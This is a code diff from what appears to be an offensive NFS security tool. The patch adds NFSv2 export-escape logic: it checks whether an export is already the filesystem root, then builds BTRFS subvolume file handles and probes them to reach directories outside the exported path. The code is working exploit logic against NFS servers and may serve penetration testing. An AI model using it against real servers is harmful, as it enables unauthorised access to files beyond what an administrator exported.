@@ -446,6 +446,19 @@ async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &
     let transport = DirectTransport::with_auth(io, opaque, opaque_auth::default());
     let client = Nfs2Client::new(transport);
 
+    // Guard: if the export already IS the filesystem root there is nothing outside the
+    // export to reach. NFSv2 handles are opaque 32-byte blobs without a Linux header, so
+    // we cannot use fingerprint_fs; instead check the export root's fileid directly.
+    // fileid 2 = ext4/ext3 root; 32/64/128 = XFS root (varies by inode size).
+    let export_fh = Nfs2FileHandle::from_bytes(seed.as_bytes());
+    if let Ok(attrs) = client.getattr(&export_fh).await
+        && attrs.ftype == FType::Directory
+        && matches!(attrs.fileid, 2 | 32 | 64 | 128)
+    {
+        eprintln!("{}", crate::output::status_info(&format!("Export {host}:{export} already is the filesystem root -- nothing outside the export to reach")));
+        return Ok(EscapeOutcome::Unsupported);
+    }
+
     let mut found_stale = false;
 
     // Phase 1: known root candidates
@@ -470,6 +483,24 @@ async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &
         match client.getattr(&fh).await {
             Ok(a) if a.ftype == FType::Directory => {
                 return Ok(EscapeOutcome::Success { candidate, note: "found via scan (NFSv2)".to_owned() });
+            },
+            Err(e) if matches!(e.status(), Some(nfswolf_nfs2::NfsStat::Stale)) => {
+                found_stale = true;
+            },
+            _ => {},
+        }
+    }
+
+    // Phase 3: BTRFS subvolume handles.
+    // BTRFS handles are 32 bytes on Linux knfsd, matching NFSv2's fixed FHSIZE exactly.
+    // construct_btrfs_subvol_handles returns variable-length FileHandles; Nfs2FileHandle::from_bytes
+    // takes the first 32 bytes (or pads shorter handles with zeros).
+    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&seed, DEFAULT_BTRFS_SUBVOLS);
+    for candidate in &btrfs {
+        let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
+        match client.getattr(&fh).await {
+            Ok(a) if a.ftype == FType::Directory => {
+                return Ok(EscapeOutcome::Success { candidate: candidate.clone(), note: "subvolume (verified, NFSv2)".to_owned() });
             },
             Err(e) if matches!(e.status(), Some(nfswolf_nfs2::NfsStat::Stale)) => {
                 found_stale = true;
